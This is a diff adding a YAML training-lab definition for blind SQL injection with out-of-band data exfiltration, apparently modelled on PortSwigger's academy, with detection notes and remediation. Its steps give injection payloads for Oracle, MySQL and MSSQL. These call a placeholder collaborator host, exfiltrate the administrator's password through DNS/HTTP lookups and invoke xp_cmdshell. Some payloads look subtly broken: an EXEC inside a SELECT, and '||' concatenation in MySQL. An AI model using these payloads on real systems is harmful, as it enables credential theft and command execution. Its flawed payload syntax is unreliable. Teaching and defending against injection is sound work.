@@ -1,0 +1,102 @@
+# Category: SQL Injection
+name: "Blind SQL injection with out-of-band data exfiltration"
+id: "sql-injection-blind-oob-exfil-001"
+category: "sql_injection"
+subcategory: "blind"
+difficulty: "practitioner"
+estimated_time: "75 minutes"
+
+description: |
+  This lab contains a blind SQL injection vulnerability. The attacker needs
+  to exfiltrate data using out-of-band techniques. This is a more complex
+  scenario where the attacker needs to extract sensitive data using DNS or
+  HTTP requests.
+
+learning_objectives:
+  - Understand out-of-band data exfiltration
+  - Use DNS or HTTP requests to exfiltrate data
+  - Extract sensitive data from the database
+
+tools:
+  - Burp Suite
+  - curl
+  - Collaborator (Burp or custom)
+
+prerequisites:
+  - Basic understanding of SQL
+  - Access to the lab environment
+  - Burp Collaborator or similar
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify the vulnerable parameter"
+    commands:
+      - "# Browse to the lab and intercept a request"
+      - "# Observe the parameter used in the SQL query"
+    expected_output: "The parameter is used in a SQL query"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Test for out-of-band SQL injection"
+    commands:
+      - "# For Oracle:"
+      - "parameter=value' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://collaborator-url/\">%remote;]>'), '/l') FROM dual--"
+      - "# For MySQL:"
+      - "parameter=value' UNION SELECT LOAD_FILE('\\\\collaborator-url\\test')--"
+      - "# For MSSQL:"
+      - "parameter=value' UNION SELECT EXEC xp_cmdshell('nslookup collaborator-url')--"
+    expected_output: "Network interaction detected in Collaborator"
+    detection: "Network logs may show unusual DNS/HTTP requests"
+
+  - id: "step3"
+    phase: "data_extraction"
+    action: "Exfiltrate data using out-of-band interaction"
+    commands:
+      - "# For Oracle:"
+      - "parameter=value' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://'||(SELECT password FROM users WHERE username='administrator')||'.collaborator-url/\">%remote;]>'), '/l') FROM dual--"
+      - "# For MySQL:"
+      - "parameter=value' UNION SELECT LOAD_FILE('\\\\'||(SELECT password FROM users WHERE username='administrator')||'.collaborator-url\\test')--"
+    expected_output: "Password exfiltrated via DNS/HTTP"
+    detection: "Network logs may show unusual DNS/HTTP requests"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1190"
+    description: "Exploit Public-Facing Application"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "DNS or HTTP requests to external domains"
+  log_indicators:
+    - "Database logs may show unusual queries"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Use parameterized queries"
+    - "Restrict database user privileges"
+  long_term:
+    - "Implement input validation"
+    - "Use an ORM"
+
+variables:
+  lab_url: "https://lab-id.web-security-academy.net"
+  parameter: "parameter"
+  collaborator_url: "collaborator-url"
+
+assessment_questions:
+  - "What is out-of-band data exfiltration?"
+  - "How can you use DNS to exfiltrate data?"
+  - "What is the difference between in-band and out-of-band injection?"
+
+references:
+  - url: "https://portswigger.net/web-security/sql-injection/blind"
+    title: "PortSwigger Blind SQL Injection"
+  - url: "https://owasp.org/www-community/attacks/Blind_SQL_Injection"
+    title: "OWASP Blind SQL Injection"
